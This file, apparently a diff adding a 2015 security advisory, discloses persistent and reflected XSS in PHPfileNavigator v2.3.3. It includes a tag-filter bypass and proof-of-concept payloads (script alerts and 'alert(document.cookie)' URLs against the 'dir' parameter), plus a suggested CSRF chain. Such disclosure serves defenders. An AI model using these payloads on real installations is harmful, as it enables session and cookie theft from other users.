@@ -1,0 +1,147 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-PHPFILENAVIGATOR0812c.txt
+
+
+
+Vendor:
+================================
+pfn.sourceforge.net
+
+
+
+Product:
+===================================
+PHPfileNavigator v2.3.3 (pfn)
+
+Is state-of-the-art, open source web based application
+to complete manage your files and folders.
+
+
+
+Vulnerability Type:
+=========================
+Persistent & Reflected XSS
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+
+Vulnerability Details:
+=====================
+Multiple persistent XSS vulnerable fields exist on the 'Modify User' form.
+nome, usuario, email etc...
+
+We can leverage existing CSRF vulnerability to update a victimz profile and
+store malicious
+XSS payload or an malicious user can inject there own payloads when
+updating thier profilez
+affecting other users and the security of the whole application.
+
+Multiple reflected XSS exists as well for following PHP pages all with same
+vulnerable
+parameter 'dir' when issuing GET requests.
+
+pfn-2.3.3 application seems to filter out <script> tags etc, but we can
+bypass this using
+<DIV onMouseMove= JS functions!.
+
+navega.php
+
+accion.php
+
+preferencias.php
+
+
+Tested using xampp-1.7.0
+
+
+Exploit code(s):
+===============
+
+Persistent XSS:
+---------------
+
+POST URL:
+http://localhost/PHPfileNavigator/pfn-2.3.3/xestion/usuarios/index.php?PHPSESSID=
+
+e.g.
+
+Inject <script>alert(666)</script> into the 'Name*', 'User*' or 'Email'
+field
+and click Accept button.
+
+Injecting XSS into 'name' field will store the XSS payload in the pfn MySQL
+database
+in 'pfn_usuarios' table called 'nome' in the 'nome' column. The Same fate
+will happen for
+other injected fields 'email & 'usuario'.
+
+
+Reflected XSS:
+--------------
+
+1)
+http://localhost/PHPfileNavigator/pfn-2.3.3/navega.php?PHPSESSID=HELL&dir=
+" <DIV  onMouseMove= "alert(document.cookie) " </a>
+
+2)
+http://localhost/PHPfileNavigator/pfn-2.3.3/accion.php?accion=buscador&PHPSESSID=HELL&dir=
+" <DIV  onMouseMove= "alert(document.cookie) " </a>
+
+3)
+http://localhost/PHPfileNavigator/pfn-2.3.3/preferencias.php?PHPSESSID=HELL&dir=
+" <DIV  onMouseMove= "alert(document.cookie) " </a>
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: August 8, 2015
+August 12, 2015 : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+Medium
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+] POST / GET
+
+
+Vulnerable Product:             [+] PHPfileNavigator v2.3.3 (pfn)
+
+
+Vulnerable Parameter(s):        [+] nome, usuario, email, dir
+
+
+Affected Area(s):               [+] Admin
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
